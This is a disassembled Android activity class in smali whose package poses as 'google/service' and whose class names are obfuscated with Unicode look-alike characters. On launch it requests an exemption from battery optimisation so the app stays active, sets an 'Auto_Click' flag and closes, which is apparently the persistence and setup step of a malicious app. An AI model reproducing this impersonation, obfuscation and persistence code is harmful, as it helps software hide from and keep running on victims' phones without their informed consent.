.class public Lgoogle/service/ʾˎʾㅤᵎˈˆـθ䉀ⁱʾㅤθㅤʾʿㅤˊㅤθㅤ4786;
.super Landroid/app/Activity;
.source "\u02be\u02ce\u02be\u3164\u1d4e\u02c8\u02c6\u0640\u03b8\u4240\u2071\u02be\u3164\u03b8\u3164\u02be\u02bf\u3164\u02ca\u3164\u03b8\u31644786.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 11
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 3

    .line 15
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 19
    :try_start_0
    invoke-static {p0}, Lgoogle/service/䉀φ₫יⶱˉˈˋφʾﹳ$ˉㅤᵢ$ˋʿʾ$ᵔ䉀ʿ$יʿㅤ$$ᴵˋ4774;->is_dozemode(Landroid/content/Context;)Z

    move-result p1

    if-nez p1, :cond_0

    .line 22
    new-instance p1, Landroid/content/Intent;

    const-string v0, "android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "package:"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 24
    invoke-virtual {p0}, Lgoogle/service/ʾˎʾㅤᵎˈˆـθ䉀ⁱʾㅤθㅤʾʿㅤˊㅤθㅤ4786;->getPackageName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-direct {p1, v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    const/high16 v0, 0x10000000

    .line 25
    invoke-virtual {p1, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v0, 0x40000000    # 2.0f

    .line 26
    invoke-virtual {p1, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 28
    invoke-virtual {p0, p1}, Lgoogle/service/ʾˎʾㅤᵎˈˆـθ䉀ⁱʾㅤθㅤʾʿㅤˊㅤθㅤ4786;->startActivity(Landroid/content/Intent;)V

    const/4 p1, 0x1

    .line 29
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    sput-object p1, Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47722;->Auto_Click:Ljava/lang/Boolean;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 43
    :catch_0
    :cond_0
    invoke-virtual {p0}, Lgoogle/service/ʾˎʾㅤᵎˈˆـθ䉀ⁱʾㅤθㅤʾʿㅤˊㅤθㅤ4786;->finish()V

    return-void
.end method
